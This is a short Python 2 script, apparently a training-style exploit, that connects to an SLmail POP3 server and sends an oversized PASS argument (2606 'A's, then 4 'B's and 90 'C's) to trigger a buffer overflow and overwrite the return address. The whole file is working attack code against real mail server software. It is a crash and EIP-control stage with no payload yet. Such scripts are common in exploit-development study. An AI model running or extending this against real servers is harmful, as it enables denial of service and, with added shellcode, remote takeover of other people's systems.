#!/usr/bin/python 
import time, sys, struct
import socket as so
buf = "A"*2606 + "B"*4 + "C"*90
try:
    server = str(sys.argv[1])
    port = int(sys.argv[2])
except IndexError:
    print "[+] Usage python %s <IP_ADDR> <PORT>"%sys.argv[0]
    sys.exit()
s = so.socket(so.AF_INET,so.SOCK_STREAM)
print "[+] Attempting to Buffer Overflow on Slmail server at %s "%sys.argv[1]
try:
    s.connect((server,port))
    s.recv(1024)
    s.send('USER stormworm\r\n')
    s.recv(1023)
    s.send('PASS '+buf+'\r\n')
    print "[+] Completed."
except:
    print "[+]Unable to connect to the SLmail Server at %s" %sys.argv[1]
    sys.exit()

